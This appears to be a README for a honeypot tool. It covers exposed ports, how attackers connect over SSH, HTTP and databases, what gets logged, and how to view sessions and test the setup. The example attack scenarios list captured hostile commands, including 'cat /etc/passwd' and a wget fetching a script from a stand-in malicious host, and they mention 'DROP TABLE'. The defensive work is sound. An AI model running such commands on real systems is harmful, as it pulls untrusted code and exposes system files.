# How Attackers Connect to Your Honeypot

## Quick Guide: Making Your Honeypot Accessible

### Step 1: Expose Your Honeypot

Your honeypot services are exposed on these ports:

- **SSH**: Port 2222
- **HTTP**: Port 8080  
- **PostgreSQL**: Port 5432
- **MySQL**: Port 3306
- **SMB**: Port 445
- **FTP**: Port 21

### Step 2: Network Configuration

#### Option A: Local Network (Testing)

If testing on your local network:

1. Find your machine's IP:
   ```bash
   # Windows
   ipconfig
   
   # Linux/Mac
   ifconfig
   # or
   ip addr
   ```

2. Attackers connect to:
   - SSH: `ssh user@YOUR_IP -p 2222`
   - HTTP: `http://YOUR_IP:8080`
   - Database: `mysql -h YOUR_IP -P 3306`

#### Option B: Public Internet (⚠️ Use with Caution)

**WARNING**: Only expose if you have proper authorization and security measures!

1. **Port Forwarding** (Router):
   - Forward ports 2222, 8080, 5432, 3306, 445, 21 to your machine
   - Use your public IP address

2. **Cloud Deployment**:
   - Deploy on cloud provider (AWS, Azure, GCP)
   - Configure security groups to allow traffic
   - Use public IP address

3. **VPN Access**:
   - Set up VPN for controlled access
   - Only allow authorized researchers

### Step 3: What Attackers See

#### SSH Honeypot

**Attacker connects:**
```bash
ssh root@your-ip -p 2222
```

**They see:**
```
Password: [they type password]
Welcome to the system.
$ [they can type commands]
```

**We capture:**
- ✅ Their IP address
- ✅ Username and password
- ✅ Every command they type
- ✅ Full session recording

#### HTTP Honeypot

**Attacker visits:**
```
http://your-ip:8080
```

**They see:**
- A normal-looking website
- Login pages
- Admin panels
- API endpoints

**We capture:**
- ✅ Their IP address
- ✅ User-Agent (browser/tool)
- ✅ All HTTP requests
- ✅ POST data (credentials, etc.)
- ✅ Headers

#### Database Honeypot

**Attacker connects:**
```bash
mysql -h your-ip -P 3306 -u root -p
# or
psql -h your-ip -p 5432 -U postgres
```

**They see:**
- Database connection prompt
- Server version info
- Connection acceptance

**We capture:**
- ✅ Their IP address
- ✅ Connection credentials
- ✅ SQL queries
- ✅ Database names

## Real-World Attack Scenarios

### Scenario 1: Automated Botnet

**What happens:**
1. Botnet scans internet for open ports
2. Finds your SSH honeypot on port 2222
3. Tries common username/password combinations
4. If successful, executes commands

**What we capture:**
- Source IP: `203.0.113.45`
- Username attempts: `root`, `admin`, `user`
- Password attempts: `password`, `123456`, `admin`
- Commands: `whoami`, `cat /etc/passwd`, `wget http://malicious.com/script.sh`

### Scenario 2: Web Scanner

**What happens:**
1. Attacker uses tool like `sqlmap` or `nikto`
2. Scans your HTTP honeypot
3. Tries common vulnerabilities
4. Attempts SQL injection, XSS, path traversal

**What we capture:**
- Source IP: `198.51.100.42`
- User-Agent: `sqlmap/1.7.2`
- Requests: `/admin`, `/.env`, `/wp-admin`
- POST data: SQL injection payloads
- IOC: SQL injection pattern detected

### Scenario 3: Database Brute Force

**What happens:**
1. Attacker scans for open database ports
2. Finds your MySQL/PostgreSQL honeypot
3. Tries to brute force credentials
4. Attempts SQL queries

**What we capture:**
- Source IP: `192.0.2.15`
- Connection attempts with various credentials
- SQL queries: `SELECT * FROM users`, `DROP TABLE`
- IOC: Malicious SQL detected

## Tracking Attackers

### View in Web Dashboard

1. Open `http://localhost:5000`
2. Click **"🎯 Attackers"** tab
3. See all attackers grouped by IP address
4. View their sessions, commands, and activities

### View in Logs

```bash
# SSH sessions
cat data/sessions/ssh_session_*.json

# HTTP requests
cat data/sessions/http_session_*.json

# All logs
cat data/logs/aggregated.log
```

### View Packet Captures

```bash
# List captures
ls -lh data/pcaps/

# Analyze with tcpdump
tcpdump -r data/pcaps/capture_*.pcap -n

# Or use Wireshark
wireshark data/pcaps/capture_*.pcap
```

## IP Address Information

### What We Capture

For every connection:
- **Source IP**: The attacker's IP address
- **Timestamp**: Exact time of connection
- **Protocol**: SSH, HTTP, Database, etc.
- **Session ID**: Unique identifier

### Example Session Data

```json
{
  "session_id": "ssh_1705312345_203.0.113.45",
  "client_ip": "203.0.113.45",
  "start_time": "2024-01-15T10:30:00",
  "login_attempts": [
    {
      "username": "root",
      "password": "password123",
      "timestamp": "2024-01-15T10:30:05"
    }
  ],
  "commands": [
    {
      "command": "whoami",
      "timestamp": "2024-01-15T10:30:10"
    }
  ]
}
```

## Security Considerations

⚠️ **Important:**

1. **Isolation**: Keep honeypot isolated from production networks
2. **Monitoring**: Monitor all connections closely
3. **Alerts**: Set up alerts for suspicious activity
4. **Legal**: Only deploy with proper authorization
5. **Data Protection**: Secure collected data

## Testing Your Honeypot

### Test SSH

```bash
ssh test@localhost -p 2222
# Password: anything (will be accepted)
# Try commands: whoami, ls, cat /etc/passwd
```

### Test HTTP

```bash
curl http://localhost:8080
curl -X POST http://localhost:8080/login -d "username=admin&password=test"
```

### Test Database

```bash
mysql -h localhost -P 3306 -u root -p
# or
psql -h localhost -p 5432 -U postgres
```

### Check Dashboard

Open `http://localhost:5000` and see:
- Your test connections
- IP addresses (localhost/127.0.0.1)
- Commands/requests
- Session details

## Summary

**To make your honeypot accessible:**

1. ✅ Services are already exposed on configured ports
2. ✅ Find your IP address (local or public)
3. ✅ Attackers connect to `YOUR_IP:PORT`
4. ✅ Everything is automatically logged
5. ✅ View in dashboard at `http://localhost:5000/attackers`

**Everything attackers do is tracked:**
- ✅ Their IP address
- ✅ What they access
- ✅ Credentials they use
- ✅ Commands they execute
- ✅ Full network traffic

**The honeypot appears real, but you see everything!** 🎯

